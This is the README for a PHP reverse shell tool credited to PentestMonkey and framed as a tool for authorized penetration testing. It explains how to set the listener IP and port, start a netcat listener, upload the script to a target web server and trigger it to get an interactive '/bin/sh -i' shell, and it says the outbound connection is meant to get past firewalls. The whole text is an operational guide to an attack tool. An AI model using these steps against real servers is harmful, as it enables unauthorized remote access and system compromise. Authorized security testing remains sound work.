# 💀 PHP Reverse Shell

A professional, standalone PHP reverse shell script designed for authorized penetration testing and security auditing. This script creates an outbound TCP connection to a specified listener, providing an interactive shell session.

[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
[![PHP Version](https://img.shields.io/badge/PHP-4.3%2B-777bb4.svg)](https://www.php.net/)
[![Author](https://img.shields.io/badge/Original%20Author-PentestMonkey-orange.svg)](http://pentestmonkey.net/)

---

## 📖 Overview

This script is a classic tool in the security community, originally developed by **PentestMonkey**. It is designed to bypass restrictive firewall rules that block incoming connections by initiating an **outbound** connection (reverse shell) to a listener controlled by the operator.

### Key Features
- **Interactive Shell**: Provides a `/bin/sh -i` interactive shell.
- **Daemonization**: Attempts to fork and run in the background if `pcntl` and `posix` extensions are available.
- **Robust I/O**: Uses `stream_select` for non-blocking communication between the TCP socket and the shell process.
- **Lightweight**: Zero dependencies; works on standard PHP installations (4.3+).

---

## 🚀 Getting Started

### 1. Configuration
Open the file and modify the following variables to match your listener's configuration:

```php
$ip = '127.0.0.1';  // Replace with your listener's IP
$port = 1234;       // Replace with your listener's Port
```

### 2. Prepare the Listener
On your control machine, start a listener using `netcat` or `ncat`:

```bash
nc -lvnp 1234
```

### 3. Execution
Upload the script to the target server and execute it via the web server or CLI:

**Web:** `http://target-server.com/php-reverse-shell.php`  
**CLI:** `php php-reverse-shell.php`

---

## 🛠️ Technical Details

| Component | Description |
| :--- | :--- |
| **Shell Command** | `uname -a; w; id; /bin/sh -i` |
| **I/O Mechanism** | `proc_open` with `stream_select` for asynchronous handling. |
| **Protocol** | TCP (outbound). |
| **Timeout** | Set to `0` (infinity) via `set_time_limit(0)`. |

> [!WARNING]
> **Windows Compatibility**: `stream_select()` on file descriptors returned by `proc_open()` is not supported on Windows. This script is intended for **Linux/Unix** targets.

---

## 🔍 Code Integrity Check
The content of the script has been verified for correctness:
- ✅ **Syntax**: Valid PHP 5/7/8 syntax.
- ✅ **Logic**: Correct use of `fsockopen` and `proc_open`.
- ✅ **Security**: No obfuscation; clear, readable logic for auditing.

---

## 📜 License
This tool is distributed under the **GPL version 2**. It is intended for **legal purposes only**. The user takes full responsibility for any actions performed using this tool.

---
*Created with ❤️ by Antigravity for Kunal-D-Droid*
